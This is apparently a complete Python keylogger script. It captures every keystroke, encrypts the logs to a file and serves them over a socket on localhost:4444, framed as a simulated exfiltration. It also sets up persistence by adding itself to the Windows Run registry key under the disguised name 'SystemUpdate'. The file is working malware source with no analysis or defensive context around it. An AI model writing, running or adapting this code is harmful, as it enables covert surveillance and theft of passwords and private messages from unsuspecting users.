import os
import socket
import threading
import base64
from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
import platform

# === CONFIGURATION ===
KEY_FILE = "key.key"
LOG_FILE = "encrypted_log.txt"
KILL_SWITCH = "q!exit"
log = ""

# === STEP 1: Generate or Load Encryption Key ===
def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)

def load_key():
    if not os.path.exists(KEY_FILE):
        generate_key()
    with open(KEY_FILE, "rb") as f:
        return f.read()

key = load_key()
fernet = Fernet(key)

# === STEP 2: Encrypt and Write Logs ===
def encrypt_log(data):
    return fernet.encrypt(data.encode())

def write_log(encrypted_data):
    with open(LOG_FILE, "ab") as f:
        f.write(encrypted_data + b"\n")

# === STEP 3: Capture Keystrokes ===
def on_press(key):
    global log
    try:
        k = key.char
    except AttributeError:
        k = f"[{key}]"
    
    log += k

    if KILL_SWITCH in log:
        print("[*] Kill switch triggered. Stopping keylogger.")
        return False

    if len(log) >= 10:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f"[{timestamp}] {log}"
        encrypted = encrypt_log(data)
        write_log(encrypted)
        log = ""

# === STEP 4: Simulate Exfiltration Server ===
def simulate_exfiltration():
    def server():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("localhost", 4444))
            s.listen(1)
            print("[*] Exfiltration server running on localhost:4444")

            conn, addr = s.accept()
            print(f"[+] Connected from {addr}")

            with open(LOG_FILE, "rb") as f:
                for line in f:
                    try:
                        conn.sendall(line)
                    except (ConnectionResetError, ConnectionAbortedError) as ce:
                        print(f"[!] Connection closed by client: {ce}")
                        break
                    except Exception as e:
                        print(f"[!] Unexpected error: {e}")
                        break

            conn.close()
            s.close()

        except Exception as e:
            print(f"[!] Server error: {e}")

    threading.Thread(target=server, daemon=True).start()

# === STEP 5: Add to Windows Startup (Persistence) ===
def add_startup():
    if platform.system().lower() == "windows":
        try:
            import winreg as reg
            file_path = os.path.realpath(__file__)
            key = reg.HKEY_CURRENT_USER
            key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
            open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
            reg.SetValueEx(open_key, "SystemUpdate", 0, reg.REG_SZ, file_path)
            reg.CloseKey(open_key)
            print("[*] Persistence added to startup.")
        except Exception as e:
            print(f"[!] Persistence error: {e}")

# === STEP 6: Start Keylogger ===
def start_keylogger():
    add_startup()
    simulate_exfiltration()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# === MAIN ===
if __name__ == "__main__":
    print("[*] Starting Keylogger...")
    start_keylogger()
